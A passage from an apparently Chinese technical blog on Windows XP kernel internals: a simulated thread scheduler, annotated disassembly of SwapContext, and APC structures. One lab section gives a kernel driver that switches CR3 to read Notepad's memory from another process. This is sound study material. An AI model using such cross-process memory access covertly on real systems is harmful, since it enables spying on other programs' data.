punctuation">;</span>   <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>GMThreadList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Flags <span class="token operator">&amp;</span> GMTHREAD_READY<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   DstGMThreadp <span class="token operator">=</span> <span class="token operator">&amp;</span>GMThreadList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> CurrentThreadIndex <span class="token operator">=</span> DstGMThreadp <span class="token operator">-</span> GMThreadList<span class="token punctuation">;</span> <span class="token function">SwitchContext</span><span class="token punctuation">(</span>SrcGMThreadp<span class="token punctuation">,</span> DstGMThreadp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">GMSleep</span><span class="token punctuation">(</span><span class="token keyword">int</span> MilliSeconds<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> GMThread_t<span class="token operator">*</span> GMThreadp<span class="token punctuation">;</span> GMThreadp <span class="token operator">=</span> <span class="token operator">&amp;</span>GMThreadList<span class="token punctuation">[</span>CurrentThreadIndex<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>GMThreadp<span class="token operator">-></span>Flags <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  GMThreadp<span class="token operator">-></span>Flags <span class="token operator">=</span> GMTHREAD_SLEEP<span class="token punctuation">;</span>  GMThreadp<span class="token operator">-></span>SleepMillsecondDot <span class="token operator">=</span> <span class="token function">GetTickCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> MilliSeconds<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">Scheduling</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-4-线程切换"><a href="#2-4-线程切换" class="headerlink" title="2.4 线程切换"></a>2.4 线程切换</h3><h4 id="主动切换"><a href="#主动切换" class="headerlink" title="主动切换"></a>主动切换</h4><p>在Windows内核中，也存在类似的线程切换函数，调用链如下，最终在SwapContext中完成ESP的切换。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">KiSwapThread KiSwapContext  SwapContext<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="时钟中断切换"><a href="#时钟中断切换" class="headerlink" title="时钟中断切换"></a>时钟中断切换</h4><p>除了线程的主动切换，也可以通过中断和异常从外部实现线程的切换。而时钟中断是最常用的导致线程切换的中断，但是如果线程屏蔽了中断且不会产生异常，那么该线程将无法被动切换。<br>时钟中断导致的线程切换有两种情况。<br>第一种情况是存在备用线程（KPCR.PrcbData.NextThread），此时线程会在时间片结束后立即进行切换：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">KiDispatchInterrupt SwapContext<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第二种情况是在当前次时钟中断时，当前线程对应的KPCR.PrcbData.QuantumEnd属性减为0，则会调用KiQuantumEnd寻找新的线程进行切换。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">KiDispatchInterrupt KiQuantumEnd  SwapContext<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-5-源码分析"><a href="#2-5-源码分析" class="headerlink" title="2.5 源码分析"></a>2.5 源码分析</h3><p>KiSwapThread：</p><pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">@KiSwapThread@<span class="token number">0</span> proc nearmov     <span class="token register variable">edi</span>, <span class="token register variable">edi</span>push    <span class="token register variable">esi</span>push    <span class="token register variable">edi</span>db      <span class="token number">3Eh</span>             <span class="token comment">;</span>mov     <span class="token register variable">eax</span>, <span class="token register variable">ds</span>:<span class="token number">0FFDFF020h</span> <span class="token comment">; 获取KPRCB</span>mov     <span class="token register variable">esi</span>, <span class="token register variable">eax</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">]</span>    <span class="token comment">; 获取NextThread</span>test    <span class="token register variable">eax</span>, <span class="token register variable">eax</span>mov     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>    <span class="token comment">; 获取CurrentThread</span>jz      short loc_80501CACand     dword ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">]</span>, <span class="token number">0</span> <span class="token comment">; NextThread清0</span>jmp     short loc_80501CCF <span class="token comment">; 赋值NextThread</span><span class="token label function">loc_80501CCF:</span>           mov     <span class="token register variable">ecx</span>, <span class="token register variable">eax</span><span class="token comment">; 赋值NextThread</span>call    @KiSwapContext@<span class="token number">4</span> <span class="token comment">; 调用KiSwapContext(x)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>KiSwapContext：</p><pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">@KiSwapContext@<span class="token number">4</span> proc nearvar_10<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">10h</span>var_C<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">0Ch</span>var_8<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">8</span>var_4<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">4</span>sub     <span class="token register variable">esp</span>, <span class="token number">10h</span>mov     <span class="token operator">[</span><span class="token register variable">esp</span><span class="token operator">+</span><span class="token number">10h</span><span class="token operator">+</span>var_4<span class="token operator">]</span>, <span class="token register variable">ebx</span> <span class="token comment">; 压栈</span>mov     <span class="token operator">[</span><span class="token register variable">esp</span><span class="token operator">+</span><span class="token number">10h</span><span class="token operator">+</span>var_8<span class="token operator">]</span>, <span class="token register variable">esi</span>mov     <span class="token operator">[</span><span class="token register variable">esp</span><span class="token operator">+</span><span class="token number">10h</span><span class="token operator">+</span>var_C<span class="token operator">]</span>, <span class="token register variable">edi</span>mov     <span class="token operator">[</span><span class="token register variable">esp</span><span class="token operator">+</span><span class="token number">10h</span><span class="token operator">+</span>var_10<span class="token operator">]</span>, <span class="token register variable">ebp</span>mov     <span class="token register variable">ebx</span>, <span class="token register variable">ds</span>:<span class="token number">0FFDFF01Ch</span> <span class="token comment">; 获取KPCR</span>mov     <span class="token register variable">esi</span>, <span class="token register variable">ecx</span>       <span class="token comment">; 获取NextThread</span>mov     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">124h</span><span class="token operator">]</span> <span class="token comment">; 获取CurrentThread</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">124h</span><span class="token operator">]</span>, <span class="token register variable">esi</span> <span class="token comment">; 将NextThread的值赋给KPRCB中的CurrentThread字段</span>mov     <span class="token register variable">cl</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">58h</span><span class="token operator">]</span>   <span class="token comment">; 获取TCB中的WaitIrql字段</span>call    SwapContext     <span class="token comment">; 调用SwapContext</span>mov     <span class="token register variable">ebp</span>, <span class="token operator">[</span><span class="token register variable">esp</span><span class="token operator">+</span><span class="token number">10h</span><span class="token operator">+</span>var_10<span class="token operator">]</span> <span class="token comment">; 弹栈</span>mov     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">esp</span><span class="token operator">+</span><span class="token number">10h</span><span class="token operator">+</span>var_C<span class="token operator">]</span>mov     <span class="token register variable">esi</span>, <span class="token operator">[</span><span class="token register variable">esp</span><span class="token operator">+</span><span class="token number">10h</span><span class="token operator">+</span>var_8<span class="token operator">]</span>mov     <span class="token register variable">ebx</span>, <span class="token operator">[</span><span class="token register variable">esp</span><span class="token operator">+</span><span class="token number">10h</span><span class="token operator">+</span>var_4<span class="token operator">]</span>add     <span class="token register variable">esp</span>, <span class="token number">10h</span>retn@KiSwapContext@<span class="token number">4</span> endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SwapContext：</p><pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">SwapContext proc near                   <span class="token comment">; CODE XREF: KiUnlockDispatcherDatabase(x)+72↑p</span>                                        <span class="token comment">; KiSwapContext(x)+29↑p</span>                                        <span class="token comment">; KiDispatchInterrupt()+7A↑p</span>or      <span class="token register variable">cl</span>, <span class="token register variable">cl</span>mov     byte ptr <span class="token register variable">es</span>:<span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">2Dh</span><span class="token operator">]</span>, <span class="token number">2</span>        <span class="token comment">; 修改NextThread的State字段</span>pushf<span class="token label function">loc_805428E8:</span>                           <span class="token comment">; CODE XREF: KiIdleLoop()+5A↓j</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">]</span>                      <span class="token comment">; 获取Nt_Tib</span>cmp     dword ptr <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">994h</span><span class="token operator">]</span>, <span class="token number">0</span>         <span class="token comment">; NpxSaveArea字段，与FPU和SSE寄存器相关</span>push    <span class="token register variable">ecx</span>jnz     loc_80542A2Dcmp     <span class="token register variable">ds</span>:_PPerf<span class="token keyword">GlobalGroupMask, 0</span>jnz     loc_80542A04<span class="token label function">loc_80542905:</span>                           <span class="token comment">; CODE XREF: SwapContext+12C↓j</span>                                        <span class="token comment">; SwapContext+13D↓j</span>                                        <span class="token comment">; SwapContext+148↓j</span>mov     <span class="token register variable">ebp</span>, <span class="token register variable">cr0</span>mov     <span class="token register variable">edx</span>, <span class="token register variable">ebp</span>mov     <span class="token register variable">cl</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">2Ch</span><span class="token operator">]</span>                   <span class="token comment">; 获取NextThread的DebugActive字段</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">50h</span><span class="token operator">]</span>, <span class="token register variable">cl</span>                   <span class="token comment">; 放入KPCR中</span>climov     <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">28h</span><span class="token operator">]</span>, <span class="token register variable">esp</span>                  <span class="token comment">; 将当前的ESP放入CurrentThread中的KernelStack</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">18h</span><span class="token operator">]</span>                  <span class="token comment">; 获取新的StackLimit和InitialStack</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">1Ch</span><span class="token operator">]</span>sub     <span class="token register variable">eax</span>, <span class="token number">210h</span>                       <span class="token comment">; 抬栈底，将下面的FPU去掉</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">]</span>, <span class="token register variable">ecx</span>                    <span class="token comment">; 放入KPCR中</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>, <span class="token register variable">eax</span>xor     <span class="token register variable">ecx</span>, <span class="token register variable">ecx</span>mov     <span class="token register variable">cl</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">31h</span><span class="token operator">]</span>                   <span class="token comment">; 获取NpxState</span>and     <span class="token register variable">edx</span>, <span class="token number">0FFFFFFF1h</span>or      <span class="token register variable">ecx</span>, <span class="token register variable">edx</span>or      <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">20Ch</span><span class="token operator">]</span>cmp     <span class="token register variable">ebp</span>, <span class="token register variable">ecx</span>jnz     loc_805429FClea     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">]</span><span class="token label function">loc_80542940:</span>                           <span class="token comment">; CODE XREF: SwapContext+11F↓j</span>test    dword ptr <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">-</span><span class="token number">1Ch</span><span class="token operator">]</span>, <span class="token number">20000h</span>     <span class="token comment">; 检测是否为V86模式</span>jnz     short loc_8054294C              <span class="token comment">; 获取TSS</span>sub     <span class="token register variable">eax</span>, <span class="token number">10h</span>                        <span class="token comment">; 如果是V86模式，则再次抬栈</span><span class="token label function">loc_8054294C:</span>                           <span class="token comment">; CODE XREF: SwapContext+67↑j</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">40h</span><span class="token operator">]</span>                  <span class="token comment">; 获取TSS</span>mov     <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>, <span class="token register variable">eax</span>                    <span class="token comment">; 将当前EAX值(栈顶)赋给TSS寄存器中的ESP0</span>mov     <span class="token register variable">esp</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">28h</span><span class="token operator">]</span>                  <span class="token comment">; 将NextThread的KernelStack赋给ESP</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">20h</span><span class="token operator">]</span>                  <span class="token comment">; 获取PEB</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">18h</span><span class="token operator">]</span>, <span class="token register variable">eax</span>                  <span class="token comment">; 将PEB赋值给Nt_TiB</span>stimov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">44h</span><span class="token operator">]</span>                  <span class="token comment">; 比较两个线程的ApcState.Process，判断是否为同一个进程</span>cmp     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">44h</span><span class="token operator">]</span>mov     byte ptr <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">50h</span><span class="token operator">]</span>, <span class="token number">0</span>jz      short loc_80542994              <span class="token comment">; 获取TEB</span>mov     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">44h</span><span class="token operator">]</span>                  <span class="token comment">; 获取目标线程的_KProcess</span>test    word ptr <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">20h</span><span class="token operator">]</span>, <span class="token number">0FFFFh</span>      <span class="token comment">; 判断LdtDescriptor</span>jnz     short loc_805429CExor     <span class="token register variable">eax</span>, <span class="token register variable">eax</span><span class="token label function">loc_80542975:</span>                           <span class="token comment">; CODE XREF: SwapContext+117↓j</span>lldt    <span class="token register variable">ax</span>xor     <span class="token register variable">eax</span>, <span class="token register variable">eax</span>mov     <span class="token register variable">gs</span>, <span class="token register variable">eax</span>                         <span class="token comment">; 清除gs</span>assume <span class="token register variable">gs</span>:GAPmov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">18h</span><span class="token operator">]</span>                  <span class="token comment">; 获取新的CR3</span>mov     <span class="token register variable">ebp</span>, <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">40h</span><span class="token operator">]</span>                  <span class="token comment">; 获取TSS</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">30h</span><span class="token operator">]</span>                  <span class="token comment">; 获取IopmOffset</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">1Ch</span><span class="token operator">]</span>, <span class="token register variable">eax</span>                  <span class="token comment">; 修改TSS中的CR3</span>mov     <span class="token register variable">cr3</span>, <span class="token register variable">eax</span>                        <span class="token comment">; 修改CR3寄存器</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">66h</span><span class="token operator">]</span>, <span class="token register variable">cx</span>                   <span class="token comment">; 修改IO权限位图</span>jmp     short loc_80542994              <span class="token comment">; 获取TEB</span><span class="token comment">; ---------------------------------------------------------------------------</span>align <span class="token number">4</span><span class="token label function">loc_80542994:</span>                           <span class="token comment">; CODE XREF: SwapContext+86↑j</span>                                        <span class="token comment">; SwapContext+AF↑j</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">18h</span><span class="token operator">]</span>                  <span class="token comment">; 获取TEB</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">3Ch</span><span class="token operator">]</span>                  <span class="token comment">; 获取GDT</span>mov     <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">3Ah</span><span class="token operator">]</span>, <span class="token register variable">ax</span>                   <span class="token comment">; 修改GDT表项</span>shr     <span class="token register variable">eax</span>, <span class="token number">10h</span>mov     <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">3Ch</span><span class="token operator">]</span>, <span class="token register variable">al</span>mov     <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">3Fh</span><span class="token operator">]</span>, <span class="token register variable">ah</span>inc     dword ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">4Ch</span><span class="token operator">]</span>             <span class="token comment">; 修改ContextSwitches</span>inc     dword ptr <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">61Ch</span><span class="token operator">]</span>pop     <span class="token register variable">ecx</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">]</span>, <span class="token register variable">ecx</span>                      <span class="token comment">; 赋值Nt_Tib</span>cmp     byte ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">49h</span><span class="token operator">]</span>, <span class="token number">0</span>           <span class="token comment">; 判断KernelApcPending是否为0</span>jnz     short loc_805429BD              <span class="token comment">; 返回1表示有APC需要执行</span>popfxor     <span class="token register variable">eax</span>, <span class="token register variable">eax</span>retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-6-实验1：跨进程读写"><a href="#2-6-实验1：跨进程读写" class="headerlink" title="2.6 实验1：跨进程读写"></a>2.6 实验1：跨进程读写</h3><p>由于驱动程序本身在高2G内存中运行，所以直接修改CR3读取低2G内存后修改回来即可。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ntddk.h></span>    </span>UINT32 g_cr3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 卸载驱动</span>NTSTATUS <span class="token function">UnloadDriver</span><span class="token punctuation">(</span>PDRIVER_OBJECT pDriObj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Unload Driver!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>NTSTATUS <span class="token function">ReadNotePad</span><span class="token punctuation">(</span>VOID<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    PVOID<span class="token operator">*</span> mem <span class="token operator">=</span> <span class="token punctuation">(</span>UINT32<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">ExAllocatePoolWithTag</span><span class="token punctuation">(</span>NonPagedPool<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 更改CR3</span>    _asm <span class="token punctuation">&#123;</span>        mov eax<span class="token punctuation">,</span> cr3        mov g_cr3<span class="token punctuation">,</span> eax        mov eax<span class="token punctuation">,</span> <span class="token number">0x09380340</span>        mov cr3<span class="token punctuation">,</span> eax    <span class="token punctuation">&#125;</span>    <span class="token comment">// 读取低2G内存地址</span>    <span class="token function">RtlMoveMemory</span><span class="token punctuation">(</span>mem<span class="token punctuation">,</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token number">0xAB128</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"The Text is %p\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>mem<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 改回CR3</span>    _asm <span class="token punctuation">&#123;</span>        mov eax<span class="token punctuation">,</span> g_cr3        mov cr3<span class="token punctuation">,</span> eax    <span class="token punctuation">&#125;</span>    <span class="token comment">//ExFreePool(mem);</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>NTSTATUS <span class="token function">DriverEntry</span><span class="token punctuation">(</span>PDRIVER_OBJECT pDriver<span class="token punctuation">,</span> PUNICODE_STRING RegistryPath<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Load Driver!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pDriver<span class="token operator">-></span>DriverUnload <span class="token operator">=</span> UnloadDriver<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">ReadNotePad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/4-2.png" alt="4-2"></p><h2 id="3-APC"><a href="#3-APC" class="headerlink" title="3 APC"></a>3 APC</h2><h3 id="3-1-APC结构"><a href="#3-1-APC结构" class="headerlink" title="3.1 APC结构"></a>3.1 APC结构</h3><h4 id="KAPC"><a href="#KAPC" class="headerlink" title="KAPC"></a>KAPC</h4><p>APC结构体，位于TCB中的SuspendApc字段：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _KAPCnt<span class="token operator">!</span>_KAPC   <span class="token operator">+</span><span class="token number">0x000</span> Type             <span class="token operator">:</span> Int2B   <span class="token operator">+</span><span class="token number">0x002</span> Size             <span class="token operator">:</span> Int2B   <span class="token operator">+</span><span class="token number">0x004</span> Spare0           <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x008</span> Thread           <span class="token operator">:</span> Ptr32 _KTHREAD   <span class="token operator">+</span><span class="token number">0x00c</span> ApcListEntry     <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x014</span> KernelRoutine    <span class="token operator">:</span> Ptr32     <span class="token keyword">void</span>    <span class="token operator">+</span><span class="token number">0x018</span> RundownRoutine   <span class="token operator">:</span> Ptr32     <span class="token keyword">void</span>    <span class="token operator">+</span><span class="token number">0x01c</span> NormalRoutine    <span class="token operator">:</span> Ptr32     <span class="token keyword">void</span>    <span class="token operator">+</span><span class="token number">0x020</span> NormalContext    <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x024</span> SystemArgument1  <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x028</span> SystemArgument2  <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x02c</span> ApcStateIndex    <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x02d</span> ApcMode          <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x02e</span> Inserted         <span class="token operator">:</span> UChar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Thread：APC所属的线程；</li><li>ApcListEntry：APC挂入的队列，是一个双向链表；</li><li>KernelRoutine：指向APC释放函数；</li><li>NormalRoutine：用户APC总入口或真正的内核APC函数；</li><li>NormalContext：真正的用户APC函数；</li><li>SystemArgument：APC函数的参数；</li><li>ApcMode：标识用户APC &#x2F; 内核APC；</li><li>Inserted：0时表示当前APC未挂入，1时表示已经挂入；</li><li>ApcStateIndex：<br>  0：表示原始环境；<br>  1：表示挂靠环境；<br>  2：表示当前环境；<br>  3：表示挂入APC时的当前环境；</li></ul><h4 id="KAPC-STATE"><a href="#KAPC-STATE" class="headerlink" title="KAPC_STATE"></a>KAPC_STATE</h4><p>APC队列结构体，位于KTHREAD中的ApcState字段：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _KAPC_STATEnt<span class="token operator">!</span>_KAPC_STATE   <span class="token operator">+</span><span class="token number">0x000</span> ApcListHead      <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x010</span> Process          <span class="token operator">:</span> Ptr32 _KPROCESS   <span class="token operator">+</span><span class="token number">0x014</span> KernelApcInProgress <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x015</span> KernelApcPending <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x016</span> UserApcPending   <span class="token operator">:</span> UChar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ApcListHead： 用户、内核APC队列；</li><li>Process：线程所属进程；</li><li>KernelApcInProgress：内核APC是否正在执行；</li><li>KernelApcPending：是否有正在等待的内核APC；</li><li>UserApcPending：是否有正在等待的用户APC；</li></ul><h4 id="SavedApcState"><a href="#SavedApcState" class="headerlink" title="SavedApcState"></a>SavedApcState</h4><p>备用APC队列，同样位于KTHREAD中，和ApcState字段一样，也是<em><strong>KAPC_STATE</strong></em>结构体。用于在该线程进行进程挂靠时暂时存储ApcState字段的值。<br>那么在进程挂靠时，ApcState中存储的就是所挂靠进程的APC队列。</p><h4 id="ApcStatePointer"><a href="#ApcStatePointer" class="headerlink" title="ApcStatePointer"></a>ApcStatePointer</h4><p>存储两个APC队列的指针，在正常情况下，分别执行ApcState和SavedApcState，在挂靠时交换。</p><h4 id="ApcStateIndex"><a href="#ApcStateIndex" class="headerlink" title="ApcStateIndex"></a>ApcStateIndex</h4><p>标识线程状态，0表示正常状态，1表示挂靠状态。</p><h4 id="ApcQueueable"><a 